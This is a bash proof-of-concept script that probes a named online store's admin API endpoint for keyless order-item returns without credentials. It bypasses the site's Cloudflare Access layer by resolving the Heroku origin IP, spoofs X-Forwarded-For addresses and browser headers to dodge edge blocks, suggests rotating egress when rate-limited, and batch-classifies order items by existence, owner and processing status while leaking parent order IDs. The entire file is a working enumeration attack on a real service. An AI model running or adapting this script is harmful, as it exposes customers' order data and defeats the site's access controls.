#!/usr/bin/env bash
# Fanatical v-keyless-return unauth order-item oracle
#   GET /api/orders/v-keyless-return/{24hex userId}/{24hex orderItemId}
#   zero credentials. Classifies: exists / keyless / owner / processed,
#   and leaks parent orderId via the 302 Location header.
#
# usage:
#   ./poc.sh <userId> <orderItemId> [--deep]
#   ./poc.sh -f pairs.txt          # lines: "<userId> <itemId>"
#   cat pairs.txt | ./poc.sh
# env:
#   IP=<origin ip>   override herokudns lookup
#   ARTEX_UA=<ua>    override browser UA
#   HOST=admin.fanatical.com / URL_HOST=https://admin.fanatical.com
set -u

HOST="${HOST:-admin.fanatical.com}"
URL_HOST="${URL_HOST:-https://admin.fanatical.com}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36}"
IP="${IP:-}"
DEEP=0
PAIRS_FILE=""

# ---------- args ----------
args=()
while [ $# -gt 0 ]; do
  case "$1" in
    --deep) DEEP=1; shift ;;
    -f) PAIRS_FILE="${2:-}"; shift 2 ;;
    -h|--help) sed -n '2,20p' "$0"; exit 0 ;;
    *) args+=("$1"); shift ;;
  esac
done

if [ -z "$IP" ]; then
  IP=$(nslookup -type=A "${HOST}.herokudns.com" 1.1.1.1 2>/dev/null \
       | awk '/^Address: /{print $2}' | tail -1)
fi
if [ -z "$IP" ]; then
  echo "[-] cannot resolve ${HOST}.herokudns.com; pass IP=<origin-ip>" >&2
  exit 2
fi

is_oid(){ [[ "$1" =~ ^[0-9a-fA-F]{24}$ ]]; }

# ---------- one request ----------
# $1 userId  $2 itemId  $3 extra query (optional, e.g. '?code=403&error=Order%20already%20processed')
probe(){
  local uid="$1" iid="$2" q="${3:-}"
  local anon xff hdr body code len loc msg parent verdict
  anon=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "11111111-1111-4111-8111-111111111111")
  xff="198.51.100.$((RANDOM % 200 + 10))"
  hdr=$(mktemp); body=$(mktemp)

  read -r code len < <(
    curl -sk --noproxy '*' --max-time 20 --resolve "${HOST}:443:${IP}" \
      -A "$UA" -H "anonid: $anon" -H "X-Forwarded-For: $xff" \
      -o "$body" -D "$hdr" -w '%{http_code} %{size_download}' \
      "${URL_HOST}/api/orders/v-keyless-return/${uid}/${iid}${q}" 2>/dev/null
  )

  loc=$(grep -i '^location:' "$hdr" | head -1 | sed 's/^[Ll]ocation:[[:space:]]*//' | tr -d '\r')
  msg=$(printf '%s' "$loc" | grep -oE 'errorMessage=[^&]*' | head -1 | sed 's/^errorMessage=//' | sed 's/%20/ /g')
  parent=$(printf '%s' "$loc" | grep -oE '/orders/[0-9a-fA-F]{24}' | head -1 | cut -d/ -f3)
  rm -f "$hdr" "$body"

  # ---------- classify ----------
  if ! is_oid "$iid"; then
    verdict="BAD_FORMAT(itemId not 24hex) -- 400/0B proves nothing"
  elif [ "$code" = "400" ] && [ "$len" = "0" ]; then
    verdict="NOT_FOUND"
  elif [ "$code" = "403" ]; then
    verdict="EDGE_BLOCK(browser UA + anonid required; or wrong origin path)"
  elif [ "$code" = "429" ]; then
    verdict="RATE_LIMITED(back off / rotate egress)"
  elif [ "$code" = "302" ] && [ -n "$(printf '%s' "$loc" | grep -i 'cloudflareaccess')" ]; then
    verdict="CF_ACCESS(did not reach origin: missing --noproxy '*' or stale IP)"
  elif [ "$code" = "302" ] && [ -n "$(printf '%s' "$msg" | grep -i 'Not A Keyless Order Item')" ]; then
    verdict="EXISTS_NON_KEYLESS(type branch, userId irrelevant)"
  elif [ "$code" = "302" ] && [ -n "$(printf '%s' "$msg" | grep -i 'Incorrect User')" ]; then
    verdict="EXISTS_KEYLESS_OTHER_USER(userId is not the owner)"
  elif [ "$code" = "302" ] && [ -n "$(printf '%s' "$msg" | grep -i 'Order Already Processed')" ]; then
    verdict="EXISTS_KEYLESS_OWNER_PROCESSED(userId is owner)"
  elif [ "$code" = "302" ] && [ -n "$(printf '%s' "$msg" | grep -i 'Unexpected Error')" ]; then
    verdict="EXISTS_KEYLESS_OWNER(null path, likely already processed)"
  else
    verdict="OTHER"
  fi

  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$verdict" "$code" "$len" "${parent:--}" "${msg:--}" "$iid"

  # --deep: resend owner-branch with the explicit code/error to get the 172B "Order Already Processed"
  if [ "$DEEP" = "1" ] && [ -z "$q" ] && printf '%s' "$verdict" | grep -q 'OWNER'; then
    probe "$uid" "$iid" '?code=403&error=Order%20already%20processed' | sed 's/^/  deep-> /'
  fi
}

echo -e "verdict\tcode\tlen\tparent_order\terrorMessage\titemId"
echo "[*] origin=${HOST}:443 -> ${IP}" >&2

if [ -n "$PAIRS_FILE" ]; then
  while read -r uid iid _; do
    [ -z "${uid:-}" ] && continue
    probe "$uid" "$iid"
  done < "$PAIRS_FILE"
elif [ ${#args[@]} -ge 2 ]; then
  probe "${args[0]}" "${args[1]}"
elif [ ${#args[@]} -eq 1 ]; then
  echo "usage: $0 <userId> <orderItemId> | -f pairs.txt | < pairs.txt" >&2; exit 2
else
  while read -r uid iid _; do
    [ -z "${uid:-}" ] && continue
    probe "$uid" "$iid"
  done
fi